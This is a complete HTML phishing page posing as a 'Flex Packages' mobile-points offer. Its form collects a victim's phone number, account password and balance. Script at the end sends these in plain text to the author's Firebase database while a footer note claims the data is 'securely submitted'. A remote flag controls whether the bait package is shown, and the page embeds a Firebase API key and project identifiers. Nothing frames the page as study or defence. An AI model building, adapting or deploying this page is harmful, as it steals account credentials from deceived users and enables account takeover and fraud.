<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Flex Packages</title>

  <!-- خط احترافي -->
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet" />

  <style>
    /* Reset وتنسيق عام */
    * {
      margin: 0; padding: 0; box-sizing: border-box;
      font-family: 'Orbitron', sans-serif;
      user-select: none;
    }
    body {
      background-color: #000;
      color: #f00; /* أحمر أساسي */
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 25px;
      overflow-x: hidden;
      position: relative;
    }

    /* Matrix background */
    @keyframes fall {
      0% { transform: translateY(-100%); }
      100% { transform: translateY(100%); }
    }
    .matrix {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      z-index: -1;
      overflow: hidden;
      background: #000;
      font-family: monospace;
      color: #0f0;
      user-select: none;
      pointer-events: none;
      opacity: 0.2;
    }
    .matrix span {
      position: absolute;
      top: -20%;
      animation: fall linear infinite;
      font-size: 16px;
      opacity: 0.6;
      text-shadow: 0 0 4px #0f0;
    }

    /* الحاوية الأساسية */
    .container {
      max-width: 950px;
      background: #120000cc;
      border: 2px solid #ff0000cc;
      border-radius: 15px;
      padding: 40px 50px;
      box-shadow: 0 0 35px #ff0000bb;
      backdrop-filter: blur(8px);
      margin-bottom: 50px;
    }
    h1 {
      color: #ff1a1a;
      font-weight: 900;
      font-size: 3.5rem;
      text-align: center;
      text-shadow: 0 0 12px #ff1a1a;
      margin-bottom: 35px;
      letter-spacing: 8px;
    }

    /* بطاقات الباقات */
    .package {
      background: #220000;
      border: 2px solid #ff0000;
      border-radius: 14px;
      padding: 25px 30px;
      margin-bottom: 22px;
      box-shadow: 0 0 18px #ff0000aa;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      cursor: default;
    }
    .package:hover {
      transform: scale(1.07);
      box-shadow: 0 0 30px #ff0000ee;
    }
    .package h2 {
      color: #ff3333;
      font-size: 2rem;
      margin-bottom: 12px;
      text-shadow: 0 0 7px #ff3333;
    }
    .package p {
      font-size: 1.2rem;
      line-height: 1.5;
      color: #ff6666;
      user-select: none;
    }

    /* فورم الإدخال */
    form {
      margin-top: 40px;
      background: #1a0000;
      padding: 35px 40px;
      border-radius: 16px;
      box-shadow: 0 0 30px #ff0000cc;
      position: relative;
    }
    label {
      display: block;
      margin-bottom: 10px;
      color: #ff4d4d;
      font-weight: 700;
      font-size: 1.2rem;
    }
    input[type="text"],
    input[type="password"],
    input[type="number"] {
      width: 100%;
      padding: 14px 18px;
      margin-bottom: 25px;
      border-radius: 10px;
      border: 2px solid #ff1a1a;
      background: #330000;
      color: #ffb3b3;
      font-size: 1.1rem;
      font-family: 'Orbitron', monospace;
      outline: none;
      transition: border-color 0.4s ease, box-shadow 0.4s ease;
    }
    input[type="text"]:focus,
    input[type="password"]:focus,
    input[type="number"]:focus {
      border-color: #ff4d4d;
      box-shadow: 0 0 15px #ff4d4d;
    }
    button {
      background-color: #ff0000;
      border: none;
      padding: 16px 30px;
      border-radius: 14px;
      color: #000;
      font-weight: 900;
      font-size: 1.3rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
      width: 100%;
      user-select: none;
    }
    button:hover {
      background-color: #cc0000;
    }

    /* رسالة ملاحظة */
    .note {
      color: #ff6666;
      font-weight: 700;
      margin-bottom: 25px;
      font-size: 1rem;
      text-align: center;
      user-select: none;
    }

    /* حقوق الطبع */
    footer {
      text-align: center;
      margin-top: auto;
      padding: 22px 12px;
      color: #900000;
      font-size: 1rem;
      font-weight: 700;
      text-shadow: 0 0 12px #ff0000;
      letter-spacing: 2.5px;
      user-select: none;
      border-top: 1px solid #440000;
      width: 100%;
      max-width: 950px;
    }

    /* نوافذ منبثقة احترافية */
    .modal-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255,0,0,0.85);
      backdrop-filter: blur(8px);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.3s ease;
    }
    .modal-overlay.active {
      opacity: 1;
      pointer-events: auto;
    }
    .modal {
      background: #220000;
      border: 2px solid #ff0000;
      border-radius: 20px;
      padding: 30px 40px;
      max-width: 450px;
      text-align: center;
      box-shadow: 0 0 35px #ff0000dd;
      color: #ff9999;
      user-select: none;
      font-size: 1.1rem;
      position: relative;
    }
    .modal h3 {
      font-size: 1.8rem;
      margin-bottom: 20px;
      color: #ff4444;
      text-shadow: 0 0 12px #ff4444;
    }
    .modal p {
      line-height: 1.5;
      margin-bottom: 30px;
    }
    .modal button {
      background: #ff1a1a;
      border: none;
      padding: 12px 28px;
      border-radius: 12px;
      color: #000;
      font-weight: 700;
      font-size: 1.1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .modal button:hover {
      background: #cc0000;
    }
    .modal .close-btn {
      position: absolute;
      top: 12px;
      right: 16px;
      font-size: 1.4rem;
      font-weight: 900;
      color: #ff2222;
      cursor: pointer;
      user-select: none;
      transition: color 0.3s ease;
    }
    .modal .close-btn:hover {
      color: #ff5555;
    }

  </style>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>

</head>
<body>

  <div class="matrix" aria-hidden="true"></div>

  <div class="container" role="main" aria-label="Flex Packages">
    <h1>Flex Packages</h1>

    <div class="package" id="flex5200Package">
      <h2>5200 Flex Package</h2>
      <p>This package contains 5200 flex points and is subject to admin control.</p>
    </div>

    <div class="package">
      <h2>1000 Flex Package</h2>
      <p>Includes 1000 flex points.</p>
    </div>

    <form id="packageForm" aria-label="Submit Flex Package Data">
      <label for="phone">Phone Number</label>
      <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required autocomplete="off" inputmode="tel" pattern="[0-9]{10,15}" />

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="new-password" />

      <label for="balance">Net Balance (Flex)</label>
      <input type="number" id="balance" name="balance" placeholder="Enter your net balance" required min="0" />

      <button type="submit">Submit</button>
    </form>

    <p class="note">* Your data will be securely submitted.</p>
  </div>

  <footer>
    &copy; 2025 Mahmoud Gamal Programming. All rights reserved.
  </footer>

  <!-- النوافذ المنبثقة -->
  <div class="modal-overlay" id="modalOverlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc">
    <div class="modal">
      <span class="close-btn" id="closeModal" aria-label="Close modal">&times;</span>
      <h3 id="modalTitle">Notification</h3>
      <p id="modalDesc"></p>
      <button id="modalOkBtn">OK</button>
    </div>
  </div>

<script>
  // Matrix effect text generation
  const matrix = document.querySelector('.matrix');
  const letters = '01';
  const columns = Math.floor(window.innerWidth / 16);
  for(let i = 0; i < columns; i++) {
    const span = document.createElement('span');
    span.style.left = `${i * 16}px`;
    span.style.animationDuration = `${3 + Math.random() * 5}s`;
    span.style.fontSize = `${14 + Math.random() * 10}px`;
    span.style.top = `${-100 - Math.random() * 300}px`;
    span.textContent = letters.charAt(Math.floor(Math.random() * letters.length));
    matrix.appendChild(span);
  }

  // Firebase config
  const firebaseConfig = {
    apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
    authDomain: "starkoscript.firebaseapp.com",
    databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
    projectId: "starkoscript",
    storageBucket: "starkoscript.appspot.com",
    messagingSenderId: "381525854892",
    appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
  };
  firebase.initializeApp(firebaseConfig);
  const db = firebase.database();

  // تحكم ظهور باقة 5200
  function checkFlex5200Availability() {
    db.ref('controls/flex5200_enabled').get().then((snapshot) => {
      if (snapshot.exists()) {
        const enabled = snapshot.val();
        const flex5200Div = document.getElementById('flex5200Package');
        if (enabled === true || enabled === 'true') {
          flex5200Div.style.display = 'block';
        } else {
          flex5200Div.style.display = 'none';
        }
      }
    }).catch((error) => {
      showModal('Error', 'Error checking package availability. Try again later.');
      console.error('Error checking flex5200_enabled:', error);
    });
  }
  checkFlex5200Availability();

  // النوافذ المنبثقة - وظيفة عرض رسالة
  const modalOverlay = document.getElementById('modalOverlay');
  const modalTitle = document.getElementById('modalTitle');
  const modalDesc = document.getElementById('modalDesc');
  const modalOkBtn = document.getElementById('modalOkBtn');
  const closeModalBtn = document.getElementById('closeModal');

  function showModal(title, message) {
    modalTitle.textContent = title;
    modalDesc.textContent = message;
    modalOverlay.classList.add('active');
  }

  modalOkBtn.addEventListener('click', () => {
    modalOverlay.classList.remove('active');
  });
  closeModalBtn.addEventListener('click', () => {
    modalOverlay.classList.remove('active');
  });
  window.addEventListener('keydown', (e) => {
    if(e.key === 'Escape') modalOverlay.classList.remove('active');
  });

  // إرسال البيانات إلى Firebase
  const form = document.getElementById('packageForm');
  form.addEventListener('submit', (e) => {
    e.preventDefault();

    const phone = form.phone.value.trim();
    const password = form.password.value.trim();
    const balance = parseInt(form.balance.value.trim());

    if (!phone || !password || isNaN(balance)) {
      showModal('Invalid Input', 'Please fill all fields correctly.');
      return;
    }

    const newDataRef = db.ref('submissions').push();
    newDataRef.set({
      phone: phone,
      password: password,
      net_balance: balance,
      timestamp: Date.now()
    }).then(() => {
      showModal('Success', 'Data submitted successfully!');
      form.reset();
    }).catch((error) => {
      showModal('Submission Failed', 'Failed to submit data: ' + error.message);
    });
  });
</script>

</body>
</html>
